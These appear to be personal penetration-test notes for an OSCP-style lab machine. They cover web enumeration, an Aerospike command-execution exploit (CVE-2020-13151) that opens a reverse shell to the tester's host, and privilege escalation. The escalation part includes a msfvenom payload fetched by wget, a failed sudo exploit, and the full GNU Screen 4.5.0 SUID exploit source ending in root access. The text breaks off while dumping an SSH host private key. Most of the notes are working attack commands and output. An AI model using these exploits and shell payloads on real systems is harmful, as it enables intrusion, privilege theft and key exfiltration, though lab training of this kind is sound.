+|   Statistics: Performed 0 guesses in 5 seconds, average tps: 0.0
+|_  ERROR: The service seems to have failed or is heavily firewalled...
+
+					HTTP:80,81,443
+WAPPALIZER:
+Web servers
+- Apache HTTP Server 2.4.41
+Operating systems
+- Ubuntu
+JavaScript libraries
+- Modernizr
+
+http://192.168.225.143/
+Apache2 Ubuntu Default Page
+
+http://192.168.225.143:81/
+nginx default  /usr/share/nginx/html
+
+http://192.168.225.143:443/
+Apache2 Ubuntu Default Page
+
+					DIR BRUTE FORCE 
+gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html,htm
+
+feroxbuster -u http://<$IP> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+WORDLISTS:
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+
+gobuster dir -u http://192.168.225.143/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
+http://192.168.225.143/.htaccess            (Status: 403) [Size: 280]
+http://192.168.225.143/.hta                 (Status: 403) [Size: 280]
+http://192.168.225.143/.htpasswd            (Status: 403) [Size: 280]
+http://192.168.225.143/0                    (Status: 200) [Size: 33888]
+http://192.168.225.143/404                  (Status: 200) [Size: 4024]
+http://192.168.225.143/LICENSE              (Status: 200) [Size: 1085]
+http://192.168.225.143/api                  (Status: 301) [Size: 316] [--> http://192.168.225.143/api/]                                                                                           
+http://192.168.225.143/assets               (Status: 301) [Size: 319] [--> http://192.168.225.143/assets/]                                                                                        
+http://192.168.225.143/config               (Status: 301) [Size: 319] [--> http://192.168.225.143/config/]                                                                                        
+http://192.168.225.143/content              (Status: 301) [Size: 320] [--> http://192.168.225.143/content/]                                                                                       
+http://192.168.225.143/index.html           (Status: 200) [Size: 10918]
+http://192.168.225.143/index                (Status: 200) [Size: 33888]
+http://192.168.225.143/index.php            (Status: 200) [Size: 33888]
+http://192.168.225.143/plugins              (Status: 301) [Size: 320] [--> http://192.168.225.143/plugins/]                                                                                       
+http://192.168.225.143/server-status        (Status: 403) [Size: 280]
+http://192.168.225.143/sub                  (Status: 200) [Size: 5853]
+http://192.168.225.143/themes               (Status: 301) [Size: 319] [--> http://192.168.225.143/themes/]                                                                                        
+http://192.168.225.143/theme                (Status: 200) [Size: 27688]
+http://192.168.225.143/vendor               (Status: 301) [Size: 319] [--> http://192.168.225.143/vendor/]   
+
+FORBIDDEN
+http://192.168.225.143/assets/
+http://192.168.225.143/api/
+--
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+feroxbuster -u http://192.168.225.143/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+200      GET       15l       74w     6147c http://192.168.225.143/icons/ubuntu-logo.png
+301      GET        9l       28w      319c http://192.168.225.143/themes => http://192.168.225.143/themes/
+301      GET        9l       28w      320c http://192.168.225.143/plugins => http://192.168.225.143/plugins/
+200      GET      375l      964w    10918c http://192.168.225.143/
+301      GET        9l       28w      319c http://192.168.225.143/config => http://192.168.225.143/config/
+301      GET        9l       28w      316c http://192.168.225.143/api => http://192.168.225.143/api/
+301      GET        9l       28w      320c http://192.168.225.143/content => http://192.168.225.143/content/
+301      GET        9l       28w      319c http://192.168.225.143/assets => http://192.168.225.143/assets/
+200      GET      134l      401w     4168c http://192.168.225.143/themes/default/js/utils.js
+200      GET        3l      116w     4577c http://192.168.225.143/themes/default/js/modernizr-3.3.1-custom.min.js
+200      GET       85l      503w     5853c http://192.168.225.143/sub
+200      GET       74l      180w     2388c http://192.168.225.143/themes/default/js/pico.js
+200      GET       61l      223w     2022c http://192.168.225.143/themes/default/css/fontello.css
+200      GET       41l       83w     1920c http://192.168.225.143/themes/default/css/droidsans.css
+200      GET      386l     1148w     8882c http://192.168.225.143/themes/default/css/style.css
+200      GET       85l      500w     5830c http://192.168.225.143/sub/page
+200      GET        1l       29w      353c http://192.168.225.143/themes/default/img/pico-white.svg
+200      GET      246l     3452w    27688c http://192.168.225.143/theme
+200      GET      506l     3886w    33888c http://192.168.225.143/index
+200      GET      375l      964w    10918c http://192.168.225.143/index.html
+200      GET      506l     3886w    33888c http://192.168.225.143/index.php
+200      GET      506l     3886w    33888c http://192.168.225.143/0
+301      GET        9l       28w      319c http://192.168.225.143/vendor => http://192.168.225.143/vendor/
+200      GET       21l      172w     1085c http://192.168.225.143/LICENSE
+
+
+feroxbuster -u http://192.168.225.143/api/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+200      GET        1l        1w      178c http://192.168.225.143/api/heartbeat
+200      GET        1l        1w      178c http://192.168.225.143/api/heartbeat.php
+
+
+					API ENDPOINTS: 
+http://192.168.225.143/api/heartbeat
+[{"serviceName":"mysql","status":"online"},{"serviceName":"postgres","status":"online"},{"serviceName":"aerospike","status":"online"},{"serviceName":"OpenSSH","status":"online"}]
+
+http://192.168.225.143:81/api/heartbeat.php
+
+http://192.168.225.143:443/api/heartbeat.php
+[{"serviceName":"mysql","status":"online"},{"serviceName":"postgres","status":"online"},{"serviceName":"aerospike","status":"online"},{"serviceName":"OpenSSH","status":"online"}]
+
+feroxbuster -u http://192.168.225.143:443/api/heartbeat.php -t 30 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+http://192.168.225.143:443/api/heartbeat.php/ 
+http://192.168.225.143:443/api/heartbeat.php/.git/logs/ 
+http://192.168.225.143:443/api/heartbeat.php/cgi-bin/ 
+http://192.168.225.143:443/api/heartbeat.php/cgi-bin/.git/logs/ 
+http://192.168.225.143:443/api/heartbeat.php/cgi-bin/cgi-bin/ 
+http://192.168.225.143:443/api/heartbeat.php/.git/logs/cgi-bin/ 
+http://192.168.225.143:443/api/heartbeat.php/cgi-bin/cgi-bin/cgi-bin/
+
+
+					SEARCHSPLOIT:
+┌──(kali㉿kali)-[~]
+└─$ searchsploit aerospike     
+Aerospike Database 5.1.0.3 - OS Command Execution              | multiple/remote/49067.py
+
+┌──(kali㉿kali)-[~/Desktop/A]
+└─$ searchsploit -m 49067.py
+  Exploit: Aerospike Database 5.1.0.3 - OS Command Execution
+      URL: https://www.exploit-db.com/exploits/49067
+     Path: /usr/share/exploitdb/exploits/multiple/remote/49067.py
+    Codes: CVE-2020-13151
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/kali/Desktop/A/49067.py
+
+https://pypi.org/project/aerospike/
+┌──(kali㉿kali)-[~/Desktop/A]
+└─$ pip install aerospike
+Successfully installed aerospike-15.0.0
+
+┌──(kali㉿kali)-[~/Desktop/A]
+└─$ python3 49067.py --ahost 192.168.225.143 --pythonshell --lhost=192.168.45.157 --lport=4444
+[+] aerospike build info: 5.1.0.1
+
+[-] this instance is patched.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444  
+
+The exploit can't be used as is. Inspect the code, and find the part that perform version checking
+
+				ALTERNATIVE: CVE-2020-13151
+https://github.com/b4ny4n/CVE-2020-13151
+https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html
+
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ python3 cve2020-13151.py --ahost 192.168.225.143 --cmd "hostname"
+[+] aerospike build info: 5.1.0.1
+[+] looks vulnerable
+[+] populating dummy table.
+[+] writing to test.cve202013151
+[+] wrote lCXtDEUKaiUlKKJa
+[+] registering udf
+[+] issuing command "hostname"
+oscp
+
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ python3 cve2020-13151.py --ahost 192.168.225.143 --cmd "whoami"
+[+] aerospike build info: 5.1.0.1
+[+] looks vulnerable
+[+] populating dummy table.
+[+] writing to test.cve202013151
+[+] wrote axFzXDTiyiojlpuY
+[+] registering udf
+[+] issuing command "whoami"
+aero
+
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ python3 cve2020-13151.py --ahost 192.168.225.143 --cmd "id"
+[+] aerospike build info: 5.1.0.1
+[+] looks vulnerable
+[+] populating dummy table.
+[+] writing to test.cve202013151
+[+] wrote juoZvWnandXNgHPQ
+[+] registering udf
+[+] issuing command "id"
+uid=1000(aero) gid=1000(aero) groups=1000(aero)
+
+FAILED:
+┌──(kali㉿kali)-[~/Desktop/A]
+└─$ python3 cve2020-13151.py --ahost 192.168.225.143 --pythonshell --lport 4444 --lhost 192.168.45.157 
+[+] aerospike build info: 5.1.0.1
+[+] looks vulnerable
+[+] populating dummy table.
+[+] writing to test.cve202013151
+[+] wrote otvCryUjQuydKzPe
+[+] registering udf
+[+] sending payload, make sure you have a listener on 192.168.45.157:4444.....
+[-] UDF execution returned Client timeout: socket=30000 total=1000 iterations=1 lastNode=192.168.225.143:3000
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444    
+listening on [any] 4444 ...
+
+WORKED: 
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ python3 cve2020-13151.py --ahost 192.168.225.143 --pythonshell --lport 80 --lhost 192.168.45.157   
+[+] aerospike build info: 5.1.0.1
+[+] looks vulnerable
+[+] populating dummy table.
+[+] writing to test.cve202013151
+[+] wrote kqcopBEOMduVnjOl
+[+] registering udf
+[+] sending payload, make sure you have a listener on 192.168.45.157:80.....
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 80  
+listening on [any] 80 ...
+connect to [192.168.45.157] from (UNKNOWN) [192.168.225.143] 50296
+
+To ensure that the machine is not in an altered state due to numerous previous attempts, I recommend that you revert the machine and try again with --lport 80.
+It is a good general rule to try to get a shell on the same port on which the server is listening, in case there is a FW this could allow bidirectional communication.
+
+
+				LOCAL.TXT:
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+aero@oscp:/home/aero$ whoami
+aero
+
+aero@oscp:/home/aero$ hostname
+oscp
+
+aero@oscp:/home/aero$ id
+uid=1000(aero) gid=1000(aero) groups=1000(aero)
+
+aero@oscp:/home/aero$ find / -name "local.txt" -ls 2> /dev/null
+find / -name "local.txt" -ls 2> /dev/null
+   661154      4 -rw-r--r--   1 root     root           33 May  4 01:03 /home/aero/local.txt
+
+aero@oscp:/home/aero$ cat local.txt
+743c6ab60d1a9050b8e78bffd82e95c0
+
+aero@oscp:/home/aero$ find / -name "proof.txt" -ls 2> /dev/null
+
+
+				NETWORK: 
+aero@oscp:/home/aero$ ifconfig
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.225.143  netmask 255.255.255.0  broadcast 192.168.225.255
+        ether 00:50:56:ab:f3:a8  txqueuelen 1000  (Ethernet)
+        RX packets 5982610  bytes 560056256 (560.0 MB)
+        RX errors 0  dropped 3834  overruns 0  frame 0
+        TX packets 2994442  bytes 2967981014 (2.9 GB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 27825  bytes 2354414 (2.3 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 27825  bytes 2354414 (2.3 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+aero@oscp:/home/aero$ ip route
+default via 192.168.225.254 dev ens160 proto static 
+192.168.225.0/24 dev ens160 proto kernel scope link src 192.168.225.143 
+
+aero@oscp:/home/aero$ ss -ntplu
+Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process                                                                         
+udp     UNCONN   0        0           239.1.99.222:9918           0.0.0.0:*      users:(("ss",pid=47260,fd=21),("bash",pid=46121,fd=21),("python3",pid=46120,fd=21),("sh",pid=44223,fd=21),("python",pid=44222,fd=21))
+udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*                                                                                     
+tcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*                                                                                     
+tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*                                                                                     
+tcp     LISTEN   0        512              0.0.0.0:3000           0.0.0.0:*      users:(("ss",pid=47260,fd=22),("bash",pid=46121,fd=22),("python3",pid=46120,fd=22),("sh",pid=44223,fd=22),("python",pid=44222,fd=22))
+tcp     LISTEN   0        244              0.0.0.0:5432           0.0.0.0:*                                                                                     
+tcp     LISTEN   0        512              0.0.0.0:3001           0.0.0.0:*      users:(("ss",pid=47260,fd=19),("bash",pid=46121,fd=19),("python3",pid=46120,fd=19),("sh",pid=44223,fd=19),("python",pid=44222,fd=19))
+tcp     LISTEN   0        512              0.0.0.0:3003           0.0.0.0:*      users:(("ss",pid=47260,fd=24),("bash",pid=46121,fd=24),("python3",pid=46120,fd=24),("sh",pid=44223,fd=24),("python",pid=44222,fd=24))
+tcp     LISTEN   0        70             127.0.0.1:33060          0.0.0.0:*                                                                                     
+tcp     LISTEN   0        151              0.0.0.0:3306           0.0.0.0:*                                                                                     
+tcp     LISTEN   0        511                    *:80                   *:*                                                                                     
+tcp     LISTEN   0        511                    *:81                   *:*                                                                                     
+tcp     LISTEN   0        32                     *:21                   *:*                                                                                     
+tcp     LISTEN   0        128                 [::]:22                [::]:*                                                                                     
+tcp     LISTEN   0        244                 [::]:5432              [::]:*                                                                                     
+tcp     LISTEN   0        511                    *:443                  *:*      
+
+
+
+				PRIV ESC:
+aero@oscp:/home/aero$ sudo -l
+[sudo] password for aero:
+
+aero@oscp:/home/aero$ su
+Password: 
+su: Authentication failure
+
+aero@oscp:/home/aero$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+aero:x:1000:1000:aero:/home/aero:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+aerospike:x:997:998:Aerospike server:/opt/aerospike:/bin/sh
+mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+postgres:x:114:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+ftp:x:115:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+
+aero@oscp:/home/aero$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+
+			Password Authentication:
+find / -perm -4000 -ls 2> /dev/null
+   528634     68 -rwsr-xr-x   1 root     root          68208 Jul 14  2021 /usr/bin/passwd
+     2328    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1997/usr/lib/openssh/ssh-keysign
+
+aero@oscp:/home/aero$ ls -la /etc/passwd
+-rw-r--r-- 1 root root 2069 May 10  2021 /etc/passwd
+
+aero@oscp:/home/aero$ openssl passwd w00t
+Ub7l97TCy95As
+
+aero@oscp:/home/aero$ echo "root2:Ub7l97TCy95As:0:0:root:/root:/bin/bash" >> /etc/passwd
+<l97TCy95As:0:0:root:/root:/bin/bash" >> /etc/passwd
+bash: /etc/passwd: Permission denied
+
+				SSH FILES: 
+aero@oscp:/etc/ssh$ ls -la
+drwxr-xr-x   4 root root   4096 Mar 16  2022 .
+drwxr-xr-x 109 root root   4096 Feb 24  2023 ..
+-rw-r--r--   1 root root 535195 Mar  9  2021 moduli
+-rw-r--r--   1 root root   1603 May 29  2020 ssh_config
+drwxr-xr-x   2 root root   4096 May 29  2020 ssh_config.d
+-rw-------   1 root root   1369 May 10  2021 ssh_host_dsa_key
+-rw-r--r--   1 root root    599 May 10  2021 ssh_host_dsa_key.pub
+-rw-------   1 root root    505 May 10  2021 ssh_host_ecdsa_key
+-rw-r--r--   1 root root    171 May 10  2021 ssh_host_ecdsa_key.pub
+-rw-------   1 root root    399 May 10  2021 ssh_host_ed25519_key
+-rw-r--r--   1 root root     91 May 10  2021 ssh_host_ed25519_key.pub
+-rw-------   1 root root   2590 May 10  2021 ssh_host_rsa_key
+-rw-r--r--   1 root root    563 May 10  2021 ssh_host_rsa_key.pub
+-rw-r--r--   1 root root    342 May 10  2021 ssh_import_id
+-rw-r--r--   1 root root   3317 Mar 16  2022 sshd_config
+drwxr-xr-x   2 root root   4096 Mar  9  2021 sshd_config.d
+-rw-r--r--   1 root root   3274 Mar 16  2022 sshd_config.ucf-dist
+
+aero@oscp:/etc/ssh$ cat ssh_host_rsa_key
+cat: ssh_host_rsa_key: Permission denied
+
+aero@oscp:/etc/ssh$ cat ssh_host_ecdsa_key
+cat: ssh_host_ecdsa_key: Permission denied
+
+aero@oscp:/etc/ssh$ cat ssh_host_dsa_key
+cat: ssh_host_dsa_key: Permission denied
+
+aero@oscp:/etc/ssh$ cat ssh_host_rsa_key
+cat: ssh_host_rsa_key: Permission denied
+
+
+				PRIV ESC : Scripts
+REV SHELL: backup
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.157 LPORT=80 -f elf >reverse.elf
+wget http://192.168.45.157:80/reverse.elf 
+chmod +x reverse.elf 
+
+LINPEAS:
+python3 -m http.server 8000
+wget http://192.168.45.157:80/linpeas.sh
+chmod +x linpeas.sh
+
+PSPY: 
+wget http://192.168.45.157:80/pspy64  
+chmod +x pspy64 
+./pspy64
+
+
+LINPEAS:
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                             
+Sudo version 1.8.31   
+
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                          
+cat: write error: Broken pipe                                                                                                                               
+cat: write error: Broken pipe
+[+] [CVE-2022-2586] nft_object UAF
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: probable
+   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2021-4034] PwnKit
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: probable
+   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                                                                               
+vsftpd process found (dump creds from memory as root)                                                                                                       
+apache2 process found (dump creds from memory as root)
+sshd: process found (dump creds from memory as root)
+
+╔══════════╣ Users with console
+aero:x:1000:1000:aero:/home/aero:/bin/bash                                                                                                                  
+aerospike:x:997:998:Aerospike server:/opt/aerospike:/bin/sh
+postgres:x:114:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+══╣ PHP exec extensions
+-rw-r--r-- 1 root root 72941 Oct  6  2020 /etc/php/7.4/apache2/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+
+-rw-r--r-- 1 root root 72539 Oct  6  2020 /etc/php/7.4/cli/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+
+╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                 
+-rw-r--r-- 1 root root 599 May 10  2021 /etc/ssh/ssh_host_dsa_key.pub
+-rw-r--r-- 1 root root 171 May 10  2021 /etc/ssh/ssh_host_ecdsa_key.pub
+-rw-r--r-- 1 root root 91 May 10  2021 /etc/ssh/ssh_host_ed25519_key.pub
+-rw-r--r-- 1 root root 563 May 10  2021 /etc/ssh/ssh_host_rsa_key.pub
+ChallengeResponseAuthentication no
+UsePAM yes
+PasswordAuthentication yes
+
+══╣ Some home ssh config file was found
+/usr/share/openssh/sshd_config   
+
+══╣ /etc/hosts.allow file found, trying to read the rules:
+/etc/hosts.allow                                                                                                                                            
+Searching inside /etc/ssh/ssh_config for interesting info
+Include /etc/ssh/ssh_config.d/*.conf
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+╔══════════╣ Analyzing FTP Files (limit 70)
+-rw-r--r-- 1 root root 5850 Mar  6  2019 /etc/vsftpd.conf                                                                                                   
+anonymous_enable
+local_enable=YES
+#write_enable=YES
+#anon_upload_enable=YES
+#anon_mkdir_write_enable=YES
+#chown_uploads=YES
+#chown_username=whoever
+-rw-r--r-- 1 root root 41 Jun 18  2015 /usr/lib/tmpfiles.d/vsftpd.conf
+-rw-r--r-- 1 root root 506 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
+anonymous_enable
+local_enable
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+-rw-r--r-- 1 root root 564 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf                                                                                                                                                      
+anonymous_enable
+local_enable
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+-rw-r--r-- 1 root root 260 Feb  2  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf
+anonymous_enable
+local_enable=YES
+write_enable
+anon_upload_enable
+anon_mkdir_write_enable
+anon_other_write_enable
+
+
+			SUDO VERSION: CVE-2021-3156
+https://www.google.com/search?q=CVE-2021-3156
+https://github.com/worawit/CVE-2021-3156
+https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
+
+Distributor ID: Ubuntu
+Description:    Ubuntu 20.04.4 LTS
+Release:        20.04
+Codename:       focal
+
+wget http://192.168.45.157:80/cve-2021-3156.py 
+chmod +x cve-2021-3156.py 
+python3 cve-2021-3156.py 
+Traceback (most recent call last):
+  File "cve-2021-3156.py", line 220, in <module>
+    assert check_is_vuln(), "target is patched"
+
+
+
+			SUID enabled binaries
+	https://medium.com/@the02rike/dc-5-2927501a9638
+https://www.hackingarticles.in/hack-the-box-wall-walkthrough/
+
+I looked for SUID enabled binaries and here “/bin/screen-4.5.0” looks interesting.
+
+$ find / -perm -u=s -type f 2> /dev/null
+/usr/bin/screen-4.5.0
+
+I searched for the exploit and I and copied it to my root directory.
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit screen 4.5.0
+GNU Screen 4.5.0 - Local Privilege Escalation                  | linux/local/41154.sh
+GNU Screen 4.5.0 - Local Privilege Escalation (PoC)            | linux/local/41152.txt
+
+
+				41154.sh
+https://github.com/chacka0101/exploits/blob/master/41154.sh
+https://stackoverflow.com/questions/8692128/static-option-for-gcc
+
+Then I opened it with mousepad and if you will notice the following code then you will observe this script is written in C language and divided into three part.
+
+As following the instruction, I created three files (libhax.c, rootshell.c and 41154.sh) and pasted the code.
+
+┌──(kali㉿kali)-[~/Desktop/A/143/Proof.txt]
+└─$ nano libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+
+┌──(kali㉿kali)-[~/Desktop/A/143/Proof.txt]
+└─$ cat rootshell.c           
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+
+┌──(kali㉿kali)-[~/Desktop/A/143/Proof.txt]
+└─$ cat 41154-2.sh 
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell
+
+
+Let’s compile the C program file manually in my local system using gcc.
+Command:
+1. gcc -fPIC -shared -ldl -o libhax.so libhax.c 
+2. gcc -o rootshell rootshell.c
+Since I have stored all the files in a folder shell, now let’s upload them into the target’s system using python server.
+
+┌──(kali㉿kali)-[~/Desktop/A/143/Proof.txt]
+└─$ python3 -m http.server 80  
+
+Now download these file on the target machine inside the “/tmp” folder.
+
+wget http://192.168.45.157:80/41154-2.sh
+wget http://192.168.45.157:80/libhax.so
+wget http://192.168.45.157:80/rootshell
+
+After making file executable, execute the file “41154.sh”.
+
+$ chmod +x 41154-2.sh
+
+$ ./41154-2.sh
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-aero.
+
+/tmp/rootshell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/rootshell)
+
+			-static option for gcc?
+https://stackoverflow.com/questions/8692128/static-option-for-gcc
+
+┌──(kali㉿kali)-[~/Desktop/A/143/Proof.txt]
+└─$ gcc rootshell.c -o rootshell -static
+
+REVERT MACHINE: 
+wget http://192.168.45.157:80/41154-2.sh
+wget http://192.168.45.157:80/libhax.so
+wget http://192.168.45.157:80/rootshell
+
+$ chmod +x 41154-2.sh
+
+$ ./41154-2.sh
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-aero.
+
+root@oscp:/etc# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@oscp:~# cat proof.txt
+bfbc3ff3a9ec3d73f5a69e8ed516054e
+
+
+root@oscp:~# cat aerospike.sh
+#!/bin/bash
+if asinfo -v STATUS | grep -q "timed out" 2>/dev/null; then
+ systemctl restart aerospike.service
+fi
+
+root@oscp:/etc/ssh# cat ssh_host_rsa_key 
+cat ssh_host_rsa_key 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAov+zHfAuDaegSYMb8OSW/IyfkWMfrO1nO41sUx4UzFERTk3Ohx9l
+wtK722bpL8LPin4nH5QbCPwe0VYGOOeEStTThjqlXeRUiGN6qJeDBh9v0qtN5n43HPGjIJ
+4uTmXdgzWWO3vGrhmt3wznIuj1zmWmMcMI5+dlbf4jWbvLAL9639bESwIpL5OXxpRG8S7t
